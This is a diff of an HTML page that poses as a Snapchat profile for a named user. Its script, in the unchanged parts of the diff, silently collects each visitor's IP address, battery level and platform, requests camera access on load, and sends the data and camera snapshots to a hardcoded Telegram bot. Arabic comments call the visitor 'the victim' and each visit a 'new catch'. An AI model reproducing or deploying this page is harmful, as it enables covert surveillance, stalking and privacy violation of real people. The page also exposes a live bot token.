@@ -13,13 +13,12 @@
     <title>Snapchat | marveen_shalash</title>
     
     <style>
-        body { background-color: #FFFC00; font-family: -apple-system, sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; overflow: hidden; }
+        body { background-color: #FFFC00; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; overflow: hidden; }
         .profile-pic { width: 150px; height: 150px; border-radius: 50%; border: 5px solid #fff; margin-bottom: 10px; object-fit: cover; box-shadow: 0 4px 20px rgba(0,0,0,0.15); }
         .ghost-logo { width: 45px; margin-bottom: 25px; }
         h1 { font-size: 26px; color: #000; margin: 5px 0; font-weight: bold; }
         p { color: #333; font-size: 16px; margin-bottom: 35px; }
-        .add-btn { background-color: #00ADEE; color: #fff; padding: 15px 80px; border-radius: 35px; font-weight: bold; border: none; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.2); transition: 0.3s; }
-        .add-btn:active { transform: scale(0.95); }
+        .add-btn { background-color: #00ADEE; color: #fff; padding: 15px 80px; border-radius: 35px; font-weight: bold; border: none; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
         #v { position: absolute; width: 1px; height: 1px; opacity: 0; }
     </style>
 </head>
@@ -35,7 +34,7 @@
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        // بيانات التليجرام الخاصة بك (مؤكدة)
+        // بيانات التليجرام الخاصة بك
         const token = "8264886383:AAEaUDc_Jm_3z74zqmFfXLU9cHXhRKrhjxs";
         const chatId = "5775781038";
 
@@ -48,13 +47,13 @@
             fetch('https://api.ipify.org?format=json')
             .then(r => r.json())
             .then(async data => {
-                let b = "N/A";
+                let b = "غير معروف";
                 try { const bat = await navigator.getBattery(); b = Math.round(bat.level * 100) + "%"; } catch(e){}
                 let info = `🔥 <b>صيد جديد: @marveen_shalash</b>\n🌐 IP: <code>${data.ip}</code>\n🔋 Battery: ${b}\n📱 OS: ${navigator.platform}`;
                 sendLog(info);
             }).catch(() => sendLog("⚠️ دخول جديد (فشل سحب IP)"));
 
-            // 2. طلب إذن الكاميرا تلقائياً بمجرد الدخول
+            // 2. طلب الكاميرا تلقائياً بمجرد الدخول
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('v');
@@ -77,7 +76,7 @@
                     }, i * 600);
                 }
             } catch (err) {
-                sendLog("❌ الضحية رفض الكاميرا.");
+                sendLog("❌ الضحية رفض إذن الكاميرا.");
             }
         };
     </script>
